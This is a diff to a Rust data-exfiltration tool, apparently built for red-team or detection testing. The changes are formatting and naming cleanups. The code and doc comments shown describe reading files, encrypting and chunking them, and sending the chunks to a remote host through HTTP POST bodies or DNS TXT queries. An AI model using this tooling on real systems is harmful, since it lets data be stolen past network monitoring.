@@ -72,22 +72,22 @@ impl ExfiltrateCommandHandler for HTTPExfiltrationSubCommand {
     ///
     /// Notes:
     /// - Each file specified in `files_path` is read, optionally encrypted
-    /// with the provided cipher key, chunked into `chunks` parts,
-    /// encoded using base64->hex encoding, and sent as the body
-    /// of an HTTP POST request to the specified `url`.
+    ///   with the provided cipher key, chunked into `chunks` parts,
+    ///   encoded using base64->hex encoding, and sent as the body
+    ///   of an HTTP POST request to the specified `url`.
     ///
     /// - A delay of `delay` milliseconds is observed between sending each chunk.
     ///
     /// - The `reqwest` crate is used for HTTP requests.
     ///
     /// - If a `cipher_key` is provided, the payload is encrypted using
-    /// ChaCha20-Poly1305 before chunking and encoding.
+    ///   ChaCha20-Poly1305 before chunking and encoding.
     ///
     /// - Logging is performed at various stages to provide feedback on progress.
     ///
     /// # Errors
     /// - Returns an error if file reading, encryption, chunking,
-    /// encoding, or HTTP requests fail.
+    ///   encoding, or HTTP requests fail.
     fn handle(self, args: ExfiltrationArgs) -> crate::error::Result<()> {
         for file_path in self.files_path.iter() {
             log::debug!("Reading file {}", file_path.to_string_lossy());
@@ -95,7 +95,7 @@ impl ExfiltrateCommandHandler for HTTPExfiltrationSubCommand {
             let root_node = crate::nodes::root::RootNode::try_from(file_path)?;
             log::info!("Exfiltrating file '{}'", root_node.file_name);
 
-            let mut file_bytes = crate::encoders::buffered_read_file(&file_path)?;
+            let mut file_bytes = crate::encoders::buffered_read_file(file_path)?;
 
             if let Some(cipher_key) = args.cipher_key.as_ref() {
                 log::info!("Encrypting payload with provided cipher key.");
@@ -143,8 +143,8 @@ impl ExfiltrateCommandHandler for HTTPExfiltrationSubCommand {
 /// protocol type used when building the resolver configuration.
 #[derive(ValueEnum, Copy, Clone, Debug, PartialEq, Eq)]
 enum DNSProtocol {
-    TCP,
-    UDP,
+    Tcp,
+    Udp,
 }
 
 impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
@@ -152,8 +152,8 @@ impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
     /// enumeration.
     fn from(value: DNSProtocol) -> Self {
         match value {
-            DNSProtocol::TCP => hickory_resolver::proto::xfer::Protocol::Tcp,
-            DNSProtocol::UDP => hickory_resolver::proto::xfer::Protocol::Udp,
+            DNSProtocol::Tcp => hickory_resolver::proto::xfer::Protocol::Tcp,
+            DNSProtocol::Udp => hickory_resolver::proto::xfer::Protocol::Udp,
         }
     }
 }
@@ -175,7 +175,7 @@ pub struct DNSExfiltrationSubCommand {
     delay: u32,
 
     /// DNS transport protocol to use (TCP or UDP)
-    #[arg(short='p', long="protocol", required=false, default_value_t=DNSProtocol::UDP, value_enum)]
+    #[arg(short='p', long="protocol", required=false, default_value_t=DNSProtocol::Udp, value_enum)]
     proto: DNSProtocol,
 
     /// Optional DNS nameserver to use for lookups (default: 127.0.0.1:1053)
@@ -189,6 +189,21 @@ pub struct DNSExfiltrationSubCommand {
 }
 
 impl DNSExfiltrationSubCommand {
+    /// Build a DNS resolver instance based on the command configuration.
+    /// If a `nameserver` is provided, it is used; otherwise, the system default
+    /// resolver configuration is used.
+    ///
+    /// # Returns
+    /// A `hickory_resolver::Resolver` instance configured for use in DNS lookups.
+    ///
+    /// # Notes
+    ///
+    /// - The resolver uses the `hickory_resolver` crate and is built with
+    ///   `TokioConnectionProvider` for async DNS queries.
+    /// - If a custom `nameserver` is specified, it is added to the resolver
+    ///   configuration with the selected protocol (TCP/UDP).
+    /// - If no `nameserver` is provided, the default system resolver
+    ///   configuration is used.
     fn build_dns_resolver(&self) -> hickory_resolver::Resolver<TokioConnectionProvider> {
         let resolver_config = match self.nameserver {
             Some(name_server) => {
@@ -220,7 +235,7 @@ impl ExfiltrateCommandHandler for DNSExfiltrationSubCommand {
     /// Notes:
     /// - The resolver uses the `hickory_resolver` crate and will build an
     ///   async resolver instance. If a `nameserver` is provided, it will be
-    /// used; otherwise, the system default resolver configuration is used.
+    ///   used; otherwise, the system default resolver configuration is used.
     ///
     /// - Each encoded chunk is emitted as a TXT lookup for `<chunk>.<destination>.`
     ///   to the configured resolver; this allows an authoritative server for
